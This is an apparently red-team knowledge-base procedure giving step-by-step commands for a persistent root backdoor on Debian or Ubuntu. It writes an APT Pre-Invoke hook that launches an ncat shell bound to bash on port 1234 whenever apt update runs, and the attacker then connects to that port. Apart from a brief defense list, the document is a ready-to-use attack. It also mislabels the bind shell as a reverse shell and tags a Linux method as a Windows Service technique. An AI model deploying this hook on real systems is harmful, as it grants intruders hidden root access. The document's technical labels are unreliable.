---
id: d283689e-6075-40e1-90fb-308e6f4b1f21
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:18.119448+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - >-
    [[techniques/Create or Modify System Process|T1543 - Create or Modify System
    Process]]
  - '[[techniques/Modify Registry|T1112 - Modify Registry]]'
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques:
  - >-
    [[techniques/Create or Modify System Process: Windows Service|T1543.003 -
    Create or Modify System Process: Windows Service]]
tags:
  - '[[tags/Linux-Persistence]]'
  - '[[tags/Backdoor]]'
  - '[[tags/APT-Manipulation]]'
commands:
  - '[[commands/create-apt-backdoor-config]]'
  - '[[commands/apt-update-trigger]]'
platforms:
  - Linux
tools:
  - '[[tools/ncat]]'
validated: true
---

# Establish Persistence via Linux APT Backdoor

## Summary

This procedure establishes persistent access on a compromised Linux system by modifying the APT package manager's configuration to execute a backdoor command during package updates. It leverages the Pre-Invoke hook in APT to spawn a reverse shell using ncat, allowing root-level command execution upon triggering an apt update, ensuring long-term access even after initial compromises are remediated.

## Description

In this technique, an attacker with root access modifies the APT configuration in /etc/apt/apt.conf.d/ to inject a malicious Pre-Invoke script. This hook runs before any apt update or upgrade operation, executing arbitrary code—in this case, starting a listening shell on a specified port. The backdoor remains dormant until an administrator or automated process runs apt update, at which point it activates and provides remote access. This method is stealthy as it ties persistence to legitimate system maintenance activities, evading basic detection. It targets Debian-based distributions like Ubuntu where APT is the default package manager. Success relies on the target system's regular package updates, providing reliable but conditional persistence.

## Requirements

1. Root or sudo access on the target Linux system (Debian/Ubuntu-based).
2. Writable access to /etc/apt/apt.conf.d/ directory.
3. ncat tool installed on the target (common on Kali/Ubuntu; if missing, install via apt).
4. Attacker-controlled host with a listener ready on the chosen port (e.g., 1234).

## Defense

- Monitor /etc/apt/apt.conf.d/ files for unauthorized modifications using file integrity monitoring tools like AIDE or OSSEC.
- Implement package signature verification and restrict repository sources to trusted mirrors.
- Enforce least privilege: Run package updates in isolated environments or with non-root accounts where possible.
- Log and alert on unexpected network connections from package management processes (e.g., apt spawning ncat).
- Regularly audit cron jobs and system update scripts for anomalies.

## Objectives

1. Inject a backdoor into the APT package manager for conditional persistence.
2. Achieve root-level remote shell access upon system package updates.
3. Maintain stealth by leveraging legitimate system processes.

## Instructions

### Step 1: Verify APT Configuration Access

**Context**: Ensure root privileges and check the APT config directory to confirm writability, preventing execution failures.

Run a check command to verify permissions:

```bash
ls -la /etc/apt/apt.conf.d/
whoami
```

> This confirms you are root and the directory is writable. If not root, escalate privileges first.

**Expected Output**: Output showing root user and directory permissions (drwxr-xr-x or similar, writable by root).

### Step 2: Create Backdoor Configuration

**Context**: Write the malicious Pre-Invoke hook to a numbered config file (e.g., 42backdoor) in /etc/apt/apt.conf.d/. This file will execute the backdoor command before any apt update.

**Command** ([[commands/create-apt-backdoor-config]]):

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

> This command creates the config file with the hook that starts a nohup'd ncat listener on port 1234, spawning /bin/bash for incoming connections. The port 1234 can be adjusted based on attacker preference. Nohup ensures the process survives logout, and error redirection hides output.

**Expected Output**: No output if successful; verify with `cat /etc/apt/apt.conf.d/42backdoor` showing the injected line.

### Step 3: Trigger the Backdoor

**Context**: Simulate or wait for a package update to activate the hook. In testing, manually run apt update to immediately spawn the listener.

**Command** ([[commands/apt-update-trigger]]):

```bash
apt update
```

> This triggers the Pre-Invoke hook, starting the ncat listener in the background. On a production system, wait for scheduled updates (e.g., via cron or unattended-upgrades).

**Expected Output**: Standard apt update output (e.g., "Hit:1 http://archive.ubuntu.com/ubuntu focal InRelease"), with the backdoor spawning silently.

### Step 4: Connect to the Backdoor

**Context**: From the attacker machine, connect to the listening port to gain the root shell. Ensure a network path exists (e.g., via pivot or direct access).

Use ncat on the attacker side:

```bash
ncat -v  <target_ip> 1234
```

> Replace <target_ip> with the victim's IP. This establishes the reverse shell.

**Expected Output**: Interactive bash shell prompt (e.g., root@target:~#), confirming root access.

**Success Indicators**:
- Config file created without errors.
- Apt update runs without anomalies.
- Incoming connection yields root shell.
